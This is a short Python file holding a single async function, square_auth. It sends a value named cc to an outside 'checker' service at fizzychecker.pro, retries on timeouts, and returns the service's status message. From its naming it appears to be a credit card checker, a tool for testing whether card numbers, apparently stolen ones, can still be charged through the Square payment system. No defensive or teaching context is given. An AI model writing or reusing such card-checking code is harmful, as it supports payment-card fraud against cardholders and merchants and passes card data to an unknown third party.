import asyncio
import httpx

async def square_auth(cc, retries=5, timeout=100):
    async with httpx.AsyncClient(timeout=timeout) as client:
        for attempt in range(retries):
            try:
                response = await client.get(f"https://fizzychecker.pro/check/cc={cc}")
                if response.status_code == 200:
                    msg = response.json()["message"]
                    if "Status code" in msg:
                        msg = msg.replace("Status code ", "")
                    return msg
            except httpx.ReadTimeout as e:
                pass
            except httpx.ConnectTimeout as e:
                pass
            await asyncio.sleep(2)
        return None

